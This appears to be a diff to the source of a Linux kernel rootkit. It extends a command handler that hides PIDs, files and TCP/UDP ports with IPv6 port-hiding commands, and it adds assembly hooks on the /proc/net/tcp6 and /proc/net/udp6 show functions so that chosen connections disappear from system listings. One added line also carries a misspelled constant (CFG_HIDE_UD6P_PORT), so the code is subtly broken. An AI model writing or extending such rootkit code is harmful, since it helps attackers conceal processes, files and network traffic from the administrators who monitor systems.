@@ -927,28 +927,43 @@ int execute_command(const char __user *str, size_t length)
     } else if (strcmp(str, CFG_UNHIDE_PID) == 0) {
         pr_info("Got unhide pid command\n");
         str += sizeof(CFG_UNHIDE_PID);
-        pid_remove(str);
+        pid_remove(str);	    
 	    
     } else if (strcmp(str, CFG_HIDE_TCP_PORT) == 0) {
         pr_info("Got hide tcp port command\n");
         str += sizeof(CFG_HIDE_TCP_PORT);
-	hide_tcp4_port(str);
-	    
+	hide_tcp4_port(str);	    
     } else if (strcmp(str, CFG_UNHIDE_TCP_PORT) == 0) {
         pr_info("Got unhide tcp port command\n");
         str += sizeof(CFG_UNHIDE_TCP_PORT);
         unhide_tcp4_port(str);
 	    
+    } else if (strcmp(str, CFG_HIDE_TCP6_PORT) == 0) {
+        pr_info("Got hide tcp6 port command\n");
+        str += sizeof(CFG_HIDE_TCP6_PORT);
+	hide_tcp6_port(str);	    
+    } else if (strcmp(str, CFG_UNHIDE_TCP6_PORT) == 0) {
+        pr_info("Got unhide tcp6 port command\n");
+        str += sizeof(CFG_UNHIDE_TCP6_PORT);
+        unhide_tcp6_port(str);	   
 	    
     } else if (strcmp(str, CFG_HIDE_UDP_PORT) == 0) {
         pr_info("Got hide udp port command\n");
         str += sizeof(CFG_HIDE_UDP_PORT);
 	hide_udp4_port(str);
-	    
     } else if (strcmp(str, CFG_UNHIDE_UDP_PORT) == 0) {
         pr_info("Got unhide udp port command\n");
         str += sizeof(CFG_UNHIDE_UDP_PORT);
         unhide_udp4_port(str);
+	    
+    } else if (strcmp(str, CFG_HIDE_UDP6_PORT) == 0) {
+        pr_info("Got hide udp6 port command\n");
+        str += sizeof(CFG_HIDE_UD6P_PORT);
+	hide_udp6_port(str);
+    } else if (strcmp(str, CFG_UNHIDE_UDP6_PORT) == 0) {
+        pr_info("Got unhide udp6 port command\n");
+        str += sizeof(CFG_UNHIDE_UDP6_PORT);
+        unhide_udp6_port(str);	
 	    
     } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
         pr_info("Got hide file command\n");
@@ -1132,7 +1147,9 @@ int init(void)
     //hijack_start(tcp4_seq_show, &n_tcp4_seq_show);
 	
     asm_hook_create(get_tcp_seq_show("/proc/net/tcp"), n_tcp4_seq_show);
+    asm_hook_create(get_tcp_seq_show("/proc/net/tcp6"), n_tcp6_seq_show);
     asm_hook_create(get_udp_seq_show("/proc/net/udp"), n_udp4_seq_show);
+    asm_hook_create(get_udp_seq_show("/proc/net/udp6"), n_udp6_seq_show);
 	
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
